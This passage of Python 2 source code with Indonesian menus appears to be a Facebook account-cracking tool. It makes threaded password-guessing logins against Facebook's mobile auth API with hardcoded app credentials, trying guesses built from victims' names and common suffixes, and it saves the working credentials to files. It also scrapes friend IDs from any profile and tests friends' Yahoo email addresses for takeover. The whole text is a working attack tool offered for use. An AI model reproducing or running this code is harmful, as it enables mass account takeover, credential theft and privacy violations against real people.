											data5 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											naga5 = json.load(data5)
											if 'access_token' in naga5:
												print '\033[1;92m[Berhasil] '+ubd+' ❂ '+bos5
												oke.append(ubd+bos5)
											else:
												if 'www.facebook.com' in naga5['error_msg']:
													print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos5
													cek = open("out/pakisbang.txt", "a")
													cek.write("ID:" +ubd+ " Pw:" +bos5+"\n")
													cek.close()
													cpe.append(ubd+bos5)
												else:
													bos6 = x['last_name']+'123'
													data6 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													naga6 = json.load(data6)
													if 'access_token' in naga6:
														print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos6
														oke.append(ubd+bos6)
													else:
														if 'www.facebook.com' in naga6['error_msg']:
															print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos6
															cek = open("out/pakisbang.txt", "a")
															cek.write("ID:" +ubd+ " Pw:" +bos6+"\n")
															cek.close()
															cpe.append(ubd+bos6)
														else:
															bos7 = x['last_name']+'1234'
															data7 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															naga7 = json.load(data7)
															if 'access_token' in naga7:
																print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos7
																oke.append(ubd+bos7)
															else:
																if 'www.facebook.com' in naga7['error_msg']:
																	print '\033[1;94m[Cekpoint] ' +ubd+' ❂ '+bos7
																	cek = open("out/pakisbang.txt", "a")
																	cek.write("ID:" +ubd+ " Pw:" +bos7+"\n")
																	cek.close()
																	cpe.append(ubd+bos7)
																else:
																	bos8 = 'Pakistan'
																	data8 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	naga8 = json.load(data8)
																	if 'access_token' in naga8:
																		print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos8
																		oke.append(ubd+bos8)
																	else:
																		if 'www.facebook.com' in naga8['error_msg']:
																			print '\033[1;94m[Cekpoint] ' +ubd+' ❂ ' +bos8
																			cek = open("out/pakisbang.txt", "a")
																			cek.write("ID:" +ubd+ " Pw:" +bos8+"\n")
																			cek.close()
																			cpe.append(ubd+bos8)
																		else:
																			bos9 = x['last_name']+'786'
																			data9 = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(ubd)+"&locale=en_US&password="+(bos9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																			naga9 = json.load(data9)
																			if 'access_token' in naga9:
																				print '\033[1;92m[Berhasil] ' +ubd+' ❂ '+bos9
																				oke.append(ubd+bos9)
																			else:
																				if 'www.facebook.com' in naga9['error_msg']:
																					print '\033[1;94m[Cekpoint] ' +ubd+' ❂ ' +bos9
																					cek = open("out/pakisbang.txt", "a")
																					cek.write("ID:" +ubd+ " Pw:" +bos9+"\n")
																					cek.close()
																					cpe.append(ubd+bos9)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;94m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;94m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;94mCP \033[1;97m: \033[1;92m"+str(len(oke))+"\033[1;97m/\033[1;94m"+str(len(cpe))
	print '\033[1;97m[\033[1;94m!\033[1;97m] \033[1;97mCP file tersimpan : out/pakisbang.txt'
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 vip.py")
	
##########CRACK PASSWORD#######
def sandi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;96m01\033[1;97m]\033[1;96m->\033[1;97m Crack dari daftar teman"
	print "\033[1;97m[\033[1;96m02\033[1;97m]\033[1;96m->\033[1;97m Crack dari id publik/teman"
	print "\033[1;97m[\033[1;96m03\033[1;97m]\033[1;96m->\033[1;97m Crack dari file"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	pilih_sandi()

def pilih_sandi():
	weak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if weak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_sandi()
	elif weak =="1" or weak =="01":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
		sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 4 : ")
		sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 5 : ")
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif weak =="2" or weak =="02":
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
		print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
		sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 4 : ")
		sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 5 : ")
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m{\033[1;96m+\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;96m✓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			sandi()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif weak =="3" or weak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			print "\033[1;93m       ×××  \033[1;97mBUAT LIST PASSWORD\033[1;93m  ×××"
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 1 : NamaDepan123 ")
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 2 : NamaDepan1234 ")
			print ("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 3 : NamaDepan12345 ")
			sandi4 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 4 : ")
			sandi5 = raw_input("\033[1;97m{\033[1;96m?\033[1;97m} Sandi 5 : ")
			print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
			idlist = raw_input('\033[1;97m{\033[1;96m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;91m[!] File tidak ada'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			sandi()
		except IOError:
			print '\033[1;91m[!] File tidak ada'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			sandi()
	elif weak =="0" or weak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;96m+\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;96m?\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;96m•\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	
#####CRACK SANDI#####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			sandi1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + sandi1
				oks.append(user+sandi1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;91m[Cekpoint] ' + user + ' ❂ ' + sandi1
					cek = open("out/world.txt", "a")
					cek.write("ID:" +user+ " Pw:" +sandi1+"\n")
					cek.close()
					cekpoint.append(user+sandi1)
				else:
					sandi2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + sandi2
						oks.append(user+sandi2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;91m[Cekpoint] ' + user + ' ❂ ' + sandi2
							cek = open("out/world.txt", "a")
							cek.write("ID:" +user+ " Pw:" +sandi2+"\n")
							cek.close()
							cekpoint.append(user+sandi2)
						else:
							sandi3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + sandi3
								oks.append(user+sandi3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;91m[Cekpoint] ' + user + ' ❂ ' + sandi3
									cek = open("out/world.txt", "a")
									cek.write("ID:" +user+ " Pw:" +sandi3+"\n")
									cek.close()
									cekpoint.append(user+sandi3)
								else:
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + sandi4
										oks.append(user+sandi4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\033[1;91m[Cekpoint] ' + user + ' ❂ ' + sandi4
											cek = open("out/world.txt", "a")
											cek.write("ID:" +user+ " Pw:" +sandi4+"\n")
											cek.close()
											cekpoint.append(user+sandi4)
										else:
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(sandi5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												print '\033[1;92m[Berhasil] ' + user + ' ❂ ' + sandi5
												oks.append(user+sandi5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\033[1;91m[Cekpoint] ' + user + ' ❂ ' + sandi5
													cek = open("out/world.txt", "a")
													cek.write("ID:" +user+ " Pw:" +sandi5+"\n")
													cek.close()
													cekpoint.append(user+sandi5)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print '\033[1;97m[\033[1;96m✓\033[1;97m] \033[1;97mSelesai ....'
	print"\033[1;97m[\033[1;96m+\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;91mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print("\033[1;97m[\033[1;96m!\033[1;97m] \033[1;97mCP file tersimpan : out/world.txt")
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
	os.system("python2 vip.py")
	
######### DUMP ID ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;95m01\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari daftar teman "
	print "\033[1;97m[\033[1;95m02\033[1;97m]\033[1;96m->\033[1;97m Ambil ID dari publik/teman "
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali "
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if cuih =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		dump_pilih()
	elif cuih =="1" or cuih =="01":
		id_teman()
	elif cuih =="2" or cuih =="02":
		idfrom_teman()
	elif cuih =="0" or cuih =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		dump_pilih()
		
##### ID FACEBOOK TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m[\033[1;95m•\033[1;97m] \033[1;97mMengambil semua ID teman \033[1;97m...')
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[\033[1;95m"+str(len(idteman))+"\033[1;97m]\033[1;97m =>"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;93m'+a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;95m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;95m!\033[1;97m] \033[1;97mTotal ID : %s"%(len(idteman))
		done = raw_input("\r\033[1;97m[\033[1;95m?\033[1;97m] \033[1;97mSimpan nama file : ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mFile tersimpan : \033[1;97mout/"+done)
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		raw_input("\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 vip.py")
	except IOError:
		print"\033[1;91m[!] Gagal membuat file"
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti !")
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Gagal !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print('\033[1;97m[\033[1;95m!\033[1;97m]\033[1;97m File anda tidak tersimpan !')
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 vip.py")
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[×] Tidak ada koneksi !"
		keluar()

##### ID FACEBOOK PUBLIK #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		idt = raw_input("\033[1;97m[\033[1;95m+\033[1;97m] ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[\033[1;95m✓\033[1;97m] \033[1;97mNama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;95m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n\033[1;93m[\033[1;97m Kembali \033[1;93m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m[\033[1;95m•\033[1;97m] \033[1;97mMengambil Semua Id ...')
		print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;93m ' + a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;95m✓\033[1;97m] \033[1;97mSukses Mengambil Id \033[1;97m....'
		print"\r\033[1;97m[\033[1;95m•\033[1;97m] Total ID : %s"%(len(idfromteman))
		done = raw_input("\r\033[1;97m[\033[1;95m+\033[1;97m] \033[1;97mSimpan nama file : ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[\033[1;95m√\033[1;97m] File tersimpan : out/"+done)
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		dump()
	except OSError:
		print"\033[1;97m[!] File Tidak Tersimpan "
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		os.system("python2 vip.py")
	except IOError:
		print"\033[1;97m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		os.system("python2 vip.py")
	except (KeyboardInterrupt,EOFError):
		print("\033[1;97m[!] Terhenti")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;97m[\033[1;95m!\033[1;97m] Teman tidak ada !')
		raw_input("\n\033[1;93m[\033[1;97m Kembali \033[1;93m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m[\033[1;91m✖\033[1;97m] Tidak ada koneksi !"
		keluar()


##### PROFIL GUARD #####
def guard():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;90m01\033[1;97m]\033[1;96m->\033[1;97m Aktifkan profile guard"
	print "\033[1;97m[\033[1;90m02\033[1;97m]\033[1;96m->\033[1;97m Nonaktifkan profile guard"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	guard_pilih()

def guard_pilih():
	guar = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if guar =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		guard_pilih()
	elif guar =="1" or guar =="01":
		aktif = "true"
		gaz(toket, aktif)
	elif guar =="2" or guar =="02":
		non = "false"
		gaz(toket, non)
	elif guar =="0" or guar =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		guard_pilih()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('clear')
		print logo
		print"\033[97m[\033[92m✓\033[97m]\033[92m Sukses Mengaktifkan ..."
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		menu()
	elif '"is_shielded":false' in res.text:
		os.system('clear')
		print logo
		print"\033[97m[\033[91m✓\033[97m]\033[91m Sukses Menonaktifkan ..."
		raw_input("\n\033[1;93m[\033[1;97m Kembali \033[1;93m]")
		menu()
	else:
		print "\033[91m[!] Error"
		keluar()

##### CLONING YAHOO #####
def menu_yahoo():
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system("clear")
	print logo
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\033[1;97m[\033[1;92m01\033[1;97m]\033[1;96m->\033[1;97m Clone dari daftar teman"
	print "\033[1;97m[\033[1;92m02\033[1;97m]\033[1;96m->\033[1;97m Clone dari publik/teman"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;96m->\033[1;97m Kembali"
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	yahoo_pilih()

#### SEARCH YAHOO ####
def yahoo_pilih():
	go = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if go =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		yahoo_pilih()
	elif go =="1" or go =="01":
		yahoofriends()
	elif go =="2" or go =="02":
		yahoofromfriends()
	elif go =="0" or go =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		yahoo_pilih()
		
##### DAFTAR TEMAN #####
def yahoofriends():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	jalan('\033[1;97m[\033[1;92m~\033[1;97m] Mengambil email ...')
	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/mailku.txt','w')
	jalan('\033[1;97m[\033[1;92m•\033[1;97m] Mulai clone ...')
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Selesai ...'
	print"\033[1;97m[\033[1;92m+\033[1;97m] Total : "+str(len(berhasil))
	print"\033[1;97m[\033[1;92m•\033[1;97m] File tersimpan : out/mailku.txt"
	save.close()
	raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
	os.system("python2 vip.py")

##### CLONE ID DARI PUBLIK #####
def yahoofromfriends():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError,requests.exceptions.ConnectionError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	idt = raw_input("\033[1;97m[\033[1;92m+\033[1;97m] ID publik/teman : ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m[\033[1;92m✓\033[1;97m] Nama : "+op["name"]
	except KeyError:
		print"\033[1;91m[!] ID publik/teman tidak ada"
		raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
		menu_yahoo()
	jalan('\033[1;97m[\033[1;92m~\033[1;97m] Mengambil email ...')
	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
	kimak = json.loads(teman.text)
	save = open('out/mailteman.txt','w')
	jalan('\033[1;97m[\033[1;92m•\033[1;97m] Mulai clone\033[1;97m...')
	print "\033[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		nama = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
